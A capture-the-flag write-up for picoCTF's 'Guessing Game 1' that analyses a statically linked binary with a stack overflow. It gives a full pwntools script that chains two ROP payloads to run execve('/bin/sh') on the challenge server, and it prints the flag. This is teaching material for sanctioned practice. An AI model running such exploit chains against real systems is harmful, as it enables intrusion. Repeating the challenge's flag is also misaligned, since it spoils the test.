# Guessing Game 1
- Tags: Binary Exploitation
- Description: I made a simple game to show off my programming skills. See if you can beat it!

# Solution
- First, we need to check what protections does the program has.

```
$ file ./vuln
./vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped
```

```
$ checksec ./vuln
[*] 'path'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- Interestingly, the 64-bit executable is statically linked, this can only mean two things:

1. The program does nearly nothing.
2. The program contains all the function it needs, including the functions that usually are implemented inside the "libc".

- Let's analyze source code of the program:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#define BUFSIZE 100
long increment(long in) {
 return in + 1;
}
long get_random() {
 return rand() % BUFSIZE;
}
int do_stuff() {
 long ans = get_random();
 ans = increment(ans);
 int res = 0;
 
 printf("What number would you like to guess?\n");
 char guess[BUFSIZE];
 fgets(guess, BUFSIZE, stdin);
 
 long g = atol(guess);
 if (!g) {
  printf("That's not a valid number!\n");
 } else {
  if (g == ans) {
   printf("Congrats! You win! Your prize is this print statement!\n\n");
   res = 1;
  } else {
   printf("Nope!\n\n");
  }
 }
 return res;
}
void win() {
 char winner[BUFSIZE];
 printf("New winner!\nName? ");
 fgets(winner, 360, stdin);
 printf("Congrats %s\n\n", winner);
}
int main(int argc, char **argv){
 setvbuf(stdout, NULL, _IONBF, 0);
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 
 int res;
 
 printf("Welcome to my guessing game!\n\n");
 
 while (1) {
  res = do_stuff();
  if (res) {
   win();
  }
 }
 
 return 0;
}
```

- In order to craft the two ROP-chains we need the following local gadgets/addresses:

1. A “pop rax; ret” gadget.
2. A “pop rdi; ret” gadget.
3. A “pop rsi; ret” gadget.
4. A “pop rdx; ret” gadget.
5. A “syscall” gadget.
6. The address of the read() function.
7. The address of the first instruction of the main function.
8. An address belonging to a writable segment of memory.

- So, this the final exploit to get to the "syscall", get the interactive shell and receive the flag.

```
#!/bin/python3
from pwn import *
HOST = 'jupiter.challenges.picoctf.org'
PORT = 51462
EXE  = './vuln'
r = remote(HOST, PORT)
elf = ELF(EXE)

main    = 0x400c8c
pop_rax = 0x4163f4
pop_rdi = 0x400696
pop_rsi = 0x410ca3
pop_rdx = 0x44a6b5
syscall = 0x40137c
bss     = 0x6bc4a0
read    = elf.symbols['read']
random_sequence = [84, 87, 78, 16, 94]

r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(random_sequence[0]).encode())
r.recvuntil(b'Name? ')

payload  = b'\x90'*120
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(9)
payload += p64(read)
payload += p64(main)
r.sendline(payload)

input('The program has been exploited. Press ENTER to get a remote shell...')
r.sendline(b'/bin/sh\x00')
r.recvuntil(b'What number would you like to guess?\n')
r.sendline(str(random_sequence[1]).encode())
r.recvuntil(b'Name? ')

payload  = b'\x90'*120
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

r.sendline(payload)
r.interactive()
```

- Once we got the access to interactive shell, we can "cat" the flag and the challenge is done.

```
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_44d502016ea374b8}
```
